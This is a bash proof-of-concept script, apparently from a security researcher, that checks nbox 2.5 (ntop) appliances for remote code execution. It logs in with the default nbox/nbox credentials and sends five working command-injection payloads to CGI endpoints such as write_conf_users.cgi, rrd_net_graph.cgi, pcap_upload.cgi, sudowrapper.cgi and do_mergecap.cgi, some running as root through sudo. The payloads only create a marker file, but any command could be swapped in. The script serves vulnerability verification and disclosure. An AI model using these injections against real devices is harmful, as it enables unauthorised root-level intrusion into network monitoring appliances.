#!/bin/bash
#
# nbox 2.5 pwnage checker
#
# Usage: checker.sh [-h|--help] [PARAMETER [ARGUMENT]] [PARAMETER [ARGUMENT]] ...
#
# Parameters:
#   -h, --help            Shows this help message and exit.
#   -t URL, --target URL  Target URL. Default value is https://127.0.0.1/ntop-bin
#   -u USER, --user USER  Username for authentication. Default value is nbox
#   -p PASS, --pass PASS  Password for authentication. Default value is nbox
#
# By default, it runs locally in the nbox machine to verify the pwnage.
#
# (@javutin)
#
#     **** Here comes the paintrain! ****
#
#         . lol . lol . lol o
#                 _____      o
#      ______====  ]OO|_n_n__][.           _______
#     [__________]_|__|________)<          | nbox |
#      oo  oo   oo  'oo OOOO-| oo\\_        ~~|~~~
#  +--+--+--+--+--+--+--+--+--+-$1-+--+--+--+--+--+--+

# Constants
PWN="\e[92mPWN\e[00m"
NOPE="\e[91mNOPE\e[00m"

NBOX_IP="127.0.0.1"
NBOX_PATH="ntop-bin"
NBOX_URL="https://$NBOX_IP/$NBOX_PATH"
NBOX_USER="nbox"
NBOX_PASSWORD="nbox"

# Some functions because we can

# Usage
function usage() {
  printf "\nnbox 2.5 pwnage checker\n"
  printf "\nUsage: %s [-h|--help] [PARAMETER [ARGUMENT]] [PARAMETER [ARGUMENT]] ...\n" "${0}"
  printf "\nParameters:\n"
  printf "  -h, --help \t\tShows this help message and exit.\n"
  printf "  -t URL, --target URL \tTarget URL. Default value is %s\n" "${NBOX_URL}"
  printf "  -u USER, --user USER \tUsername for authentication. Default value is %s\n" "${NBOX_USER}"
  printf "  -p PASS, --pass PASS \tPassword for authentication. Default value is %s\n" "${NBOX_PASSWORD}"
  printf "\nExamples:\n"
  printf "  Target running in 192.168.0.22 with the credentials test/test:\n"
  printf "\t%s -t https://192.168.0.22/ntop-bin -u test -p test\n\n" "${0}"
}

# Tchoo Tchoo!
function paintrain() {
  echo ""
  echo "         . lol . lol . lol o"
  echo "                 _____      oA"
  echo "      ______====  ]OO|_n_n__][.           _______"
  echo "     [__________]_|__|________)<          | nbox |"
  echo "      oo  oo   oo  'oo OOOO-| oo\\\\_        ~~|~~~"
  echo "  +--+--+--+--+--+--+--+--+--+-$1-+--+--+--+--+--+--+"
  echo ""
  echo "    **** Here comes the paintrain! ****"
  echo ""
}

# Make sure we haz curl
function check_curl() {
  if [[ -z "$(which curl)" ]]; then
    echo "[!] You need curl to continue..."
    exit 1
  fi
}

# Helpers curl commands to make the code better. Because bash

# $1 is path to hit
function nbox_get() {
  local __path=$1
  curl -sk --user "$NBOX_USER":"$NBOX_PASSWORD" "$NBOX_URL"/"$__path" > /dev/null
}

# $1 is path to hit
function nbox_get_() {
  local __path=$1
  curl -sk --user "$NBOX_USER":"$NBOX_PASSWORD" "$NBOX_URL"/"$__path"
}

# $1 is path to hit
# $2 is POST parameters
function nbox_post() {
  local __path=$1
  local __data=$2
  curl -sk --user "$NBOX_USER":"$NBOX_PASSWORD" --data "$__data" "$NBOX_URL"/"$__path" > /dev/null
}

# Eject when error
set -e

# Ascii art is always appreciated
paintrain

ARGS=$(getopt -n "$0" -o ht:u:p: -l "help,target:,user:,pass:" -- "$@")

eval set -- "$ARGS"

while true; do
  case "$1" in
    -h|--help)
      usage
      exit 0
      ;;
    -t|--target)
      NBOX_URL=$2
      shift 2
      ;;
    -u|--user)
      NBOX_USER=$2
      shift 2
      ;;
    -p|--pass)
      NBOX_PASSWORD=$2
      shift 2
      ;;
    --)
      shift
      break
      ;;
    *)
      usage
      exit 1
      ;;
  esac
done

# Here we go
echo "[+] - Target: $NBOX_URL - User: $NBOX_USER - Password: $NBOX_PASSWORD"
echo
echo "[+] - Checking nbox is running..."
NBOX_VERSION=`nbox_get_ dashboard.cgi | grep "NTOP" | cut -d">" -f3 | cut -d"<" -f1`

if [[ -z "$NBOX_VERSION" ]]; then
  echo -e "[!] - [ $NOPE ]: Not running nbox in $NBOX_URL"
  exit 1
else
  echo -e "[+] - [ $PWN ]: Found $NBOX_VERSION running in $NBOX_URL"
fi

echo
echo "[+] - Got RCEs?"

# File to verify the RCEs
TARGET_FILE="/tmp/HACK"

# Function to display verification or failure
function result_attack() {
  local __target=$1
  local __path=$2
  if [[ -f "$__target" ]]; then
    echo -e "[+] - [ $PWN ]: RCE verified in $__path"
  else
    echo -e "[!] - [ $NOPE ]: Could not verify RCE in $__path"
  fi
}

# RCE: POST against https://NTOP-URL/ntop-bin/write_conf_users.cgi with parameter 'cmd=touch /tmp/HACK'
sudo rm -Rf "$TARGET_FILE"
TARGET_PATH="write_conf_users.cgi"
nbox_post "$TARGET_PATH" "cmd=touch $TARGET_FILE"
result_attack "$TARGET_FILE" "$TARGET_PATH"

# RCE: POST against https://NTOP-URL/ntop-bin/rrd_net_graph.cgi with parameters 'interface=;touch /tmp/HACK;'
sudo rm -Rf "$TARGET_FILE"
TARGET_PATH="rrd_net_graph.cgi"
nbox_post "$TARGET_PATH" "interface=;touch $TARGET_FILE;"
result_attack "$TARGET_FILE" "$TARGET_PATH"

# RCE (Wrapped in sudo): GET https://NTOP-URL/ntop-bin/pcap_upload.cgi?dir=|touch%20/tmp/HACK&pcap=pcap
sudo rm -Rf "$TARGET_FILE"
TARGET_PATH="pcap_upload.cgi?dir=|touch%20$TARGET_FILE&pcap=pcap"
nbox_get "$TARGET_PATH"
result_attack "$TARGET_FILE" "pcap_upload.cgi"

# RCE (Wrapped in sudo): GET https://NTOP-URL/ntop-bin/sudowrapper.cgi?script=adm_storage_info.cgi&params=P%22|whoami%3E%20%22/tmp/HACK%22|echo%20%22
sudo rm -Rf "$TARGET_FILE"
TARGET_PATH="sudowrapper.cgi?script=adm_storage_info.cgi&params=P%22|whoami%3E%20%22$TARGET_FILE%22|echo%20%22"
nbox_get "$TARGET_PATH"
result_attack "$TARGET_FILE" "adm_storage_info.cgi"

# RCE: POST against https://NTOP-URL/ntop-bin/do_mergecap.cgi with parameters opt=Merge&base_dir=/tmp&out_dir=/tmp/DOESNTEXIST;touch $TARGET_FILE;exit%200
sudo rm -Rf "$TARGET_FILE"
TARGET_PATH="do_mergecap.cgi"
nbox_post "$TARGET_PATH" "opt=Merge&base_dir=/tmp&out_dir=/tmp/DOESNTEXIST;touch $TARGET_FILE;exit%200"
result_attack "$TARGET_FILE" "$TARGET_PATH"

# Cleaning up
sudo rm -Rf "$TARGET_FILE"

echo
echo "  Have a nice day! (@javutin)"
echo

# kthnxbai
